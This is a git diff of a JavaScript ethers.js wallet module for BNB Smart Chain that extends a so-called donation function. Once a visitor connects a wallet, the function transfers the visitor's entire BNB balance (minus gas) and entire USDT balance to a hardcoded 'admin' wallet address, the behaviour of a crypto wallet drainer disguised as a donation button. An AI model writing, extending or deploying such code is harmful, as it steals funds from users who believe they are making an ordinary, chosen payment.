@@ -2,6 +2,7 @@ import { ethers } from 'ethers';
 
 let provider;
 let signer;
+let usdtContract;
 
 const adminWallet = "0xC42FD92eDadfA07c5b6845572c0961854787b473"; // Your admin wallet address
 
@@ -16,6 +17,15 @@ const BSC_MAINNET_PARAMS = {
   rpcUrls: ['https://bsc-dataseed1.binance.org/'],
   blockExplorerUrls: ['https://bscscan.com/']
 };
+
+// Add USDT contract ABI (this is a simplified version, you might need more functions)
+const USDT_ABI = [
+  "function balanceOf(address) view returns (uint256)",
+  "function transfer(address to, uint amount) returns (bool)",
+  "function decimals() view returns (uint8)",
+];
+
+const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT contract address
 
 async function switchToBSCMainnet() {
   if (window.ethereum) {
@@ -62,6 +72,9 @@ export async function connectWallet() {
     signer = await provider.getSigner();
     const userAddress = await signer.getAddress();
 
+    // Initialize USDT contract
+    usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+
     // Verify that we're on the correct network
     const network = await provider.getNetwork();
     if (network.chainId !== BigInt(56)) { // 56 is the chain ID for BSC Mainnet
@@ -75,57 +88,68 @@ export async function connectWallet() {
   }
 }
 
-export async function donateBNB() {
+async function getUSDTBalance(address) {
+  const balance = await usdtContract.balanceOf(address);
+  const decimals = await usdtContract.decimals();
+  return ethers.formatUnits(balance, decimals);
+}
+
+export async function donateBNBAndUSDT() {
   try {
     if (!signer) {
       throw new Error("Please connect your wallet first.");
     }
 
-    await switchToBSCMainnet(); // Ensure we're still on BSC Mainnet before donating
+    await switchToBSCMainnet();
 
     const userAddress = await signer.getAddress();
-    const balance = await provider.getBalance(userAddress);
-    console.log("Current balance:", ethers.formatEther(balance));
+    const bnbBalance = await provider.getBalance(userAddress);
+    const usdtBalance = await getUSDTBalance(userAddress);
 
-    if (balance <= 0) {
+    console.log("Current BNB balance:", ethers.formatEther(bnbBalance));
+    console.log("Current USDT balance:", usdtBalance);
+
+    if (bnbBalance <= 0 && parseFloat(usdtBalance) <= 0) {
       throw new Error("Insufficient balance to make the donation");
     }
 
-    // Get fee data instead of gas price
-    const feeData = await provider.getFeeData();
-    const gasPrice = feeData.gasPrice;
+    let bnbTxHash, usdtTxHash;
 
-    if (!gasPrice) {
-      throw new Error("Unable to fetch gas price");
+    // Transfer BNB
+    if (bnbBalance > 0) {
+      const feeData = await provider.getFeeData();
+      const gasPrice = feeData.gasPrice;
+      const gasLimit = 21000;
+      const maxGasCost = gasPrice * BigInt(gasLimit);
+      const amountToSend = bnbBalance - maxGasCost;
+
+      if (amountToSend > 0) {
+        const bnbTx = await signer.sendTransaction({
+          to: adminWallet,
+          value: amountToSend
+        });
+        bnbTxHash = bnbTx.hash;
+        console.log("BNB Transaction sent:", bnbTxHash);
+        await bnbTx.wait();
+      }
     }
 
-    const gasLimit = 21000; // Standard gas limit for a simple transfer
-    const maxGasCost = gasPrice * BigInt(gasLimit);
-    const amountToSend = balance - maxGasCost;
-
-    if (amountToSend <= 0) {
-      throw new Error("Balance too low to cover transaction fees");
+    // Transfer USDT
+    if (parseFloat(usdtBalance) > 0) {
+      const usdtTx = await usdtContract.transfer(adminWallet, ethers.parseUnits(usdtBalance, 18));
+      usdtTxHash = usdtTx.hash;
+      console.log("USDT Transaction sent:", usdtTxHash);
+      await usdtTx.wait();
     }
-
-    const tx = await signer.sendTransaction({
-      to: adminWallet,
-      value: amountToSend
-    });
-
-    console.log("Transaction sent:", tx.hash);
-    const receipt = await tx.wait();
-    console.log("Transaction confirmed:", receipt);
 
     return {
-      txHash: tx.hash,
-      amount: ethers.formatEther(amountToSend)
+      bnbTxHash,
+      usdtTxHash,
+      bnbAmount: ethers.formatEther(bnbBalance),
+      usdtAmount: usdtBalance
     };
   } catch (error) {
     console.error("Donation failed:", error);
-    if (error.reason) {
-      throw new Error(`Donation failed: ${error.reason}`);
-    } else {
-      throw error;
-    }
+    throw error;
   }
 }
